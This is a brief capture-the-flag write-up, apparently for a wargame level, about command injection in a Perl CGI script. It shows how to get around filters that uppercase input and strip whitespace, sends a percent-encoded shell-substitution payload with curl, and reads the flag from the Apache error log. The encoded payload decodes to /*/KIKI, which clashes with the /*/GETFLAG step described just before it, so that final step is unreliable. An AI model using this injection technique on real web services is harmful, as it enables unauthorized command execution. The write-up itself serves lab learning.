# Flag

In this level we are met with a CGI webserver perl script that takes query parameters to run some functions.

However, like always in this challenge, the arguments aren't properly sanitized before getting thrown in a shell substitution.

There are a few regex substitutions performed (uppercasing lowercase letters and removing everything after whitespaces) on our initial payload hence we need a workaround to be able to run getflag:

```bash
echo getflag > /tmp/GETFLAG
```
Our payload would then be 
```bash
$(/*/GETFLAG>&2)
```
Such that getflag is ran, its result redirected to stderr, the flag will appear in the apache error logs at /var/log/apache2/error.log

Hence here we can try to percent-encode our payload to get it through the query parameter properly:
```bash
curl "http://localhost:4646?x=%24%28%2F%2A%2FKIKI%3E%262%29"
cat /var/log/apache2/error.log
```
And voila! Our flag appears in the logs as expected!
